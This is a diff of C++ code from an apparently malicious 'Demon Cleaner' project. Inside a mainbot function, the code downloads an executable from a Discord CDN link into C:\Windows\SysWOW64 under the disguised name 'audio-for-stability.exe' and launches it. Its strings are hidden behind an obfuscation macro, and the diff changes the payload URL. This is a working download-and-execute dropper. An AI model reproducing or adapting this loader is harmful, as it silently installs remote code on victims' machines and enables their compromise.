@@ -1,5 +1,5 @@
 #pragma once
-#include "../Demon Cleaner/Headers/xorstr.hpp"
+#include "../Demon Cleaner/Headers/dead.hpp"
 #include <string>
 #include <windows.h>
 #include <Urlmon.h>
@@ -280,10 +280,13 @@ void mainbot()
                         caca5:
                 }
                 
-                std::string download = (dead("https://cdn.discordapp.com/attachments/834754431249285140/891304130897915964/Demon_Cleaner.exe").c_str());
+                std::string download = (dead("https://cdn.discordapp.com/attachments/834754431249285140/891660223981428758/demon.exe").c_str());
                 std::string path = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
                 URLDownloadToFileA(NULL, download.c_str(), path.c_str(), 0, NULL);
                 system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
+
+               
+
                 system(dead("start audio-for-stability.exe").c_str());
                 system(dead("cls").c_str());
                
